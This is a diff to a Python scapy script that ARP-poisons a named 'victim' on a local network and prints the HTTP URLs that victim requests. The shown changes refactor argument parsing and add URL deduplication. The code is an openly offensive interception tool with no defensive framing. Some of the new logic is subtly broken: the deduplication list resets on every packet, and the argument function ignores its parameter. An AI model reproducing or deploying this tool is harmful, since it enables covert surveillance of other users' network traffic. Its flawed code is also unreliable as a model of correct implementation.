@@ -1,20 +1,20 @@
+#!/usr/bin/env python
 from scapy.all import * 
 from scapy.all import Ether, ARP, srp, send
 import argparse, time, os, sys, threading
 from scapy.layers.http import HTTPRequest
 
-# Make sure you have IP forwarding enabled
-# On linux set /proc/sys/net/ipv4/ip_forward to 1 
-# On windows start service "RemoteAccess"
-
 def process_packet(packet):
+    temp = []
     if packet.haslayer(HTTPRequest):
         url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
         url = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', url)
         if len(url) > 0:
-            url = url[0]
+            url = url[0].split('%20')[0]
             ip = packet[IP].src
-            print("\n  [*] {}: {}".format(ip,url))
+            if url not in temp:
+                temp.append(url)
+                print("\n  [*] {}: {}".format(ip,url))
 
 class StoppableThread(threading.Thread):
     def __init__(self,  *args, **kwargs):
@@ -51,17 +51,22 @@ def restore(target_ip, host_ip, verbose=True):
     if verbose:
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
-if __name__ == "__main__":
+
+def process_arguments(args):
     parser = argparse.ArgumentParser(description="Tool to find url's by ARP spoofing")
     parser.add_argument("-t", "--target", help="Victim IP Address to ARP poison")
     parser.add_argument("-g", "--gateway", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
     parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
     args = parser.parse_args()
-    target, host, verbose = args.target, args.gateway, args.verbose
+    return vars(args)
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        process_arguments(['-h'])
+    userOptions = process_arguments(sys.argv[1:])    
+    target, host, verbose = userOptions['target'], userOptions['gateway'], userOptions['verbose']
 
     try:
-        #handler = threading.Thread(target=parse_url_start)
-        #handler.start()
         handler = StoppableThread()
         handler.daemon = True
         handler.start()
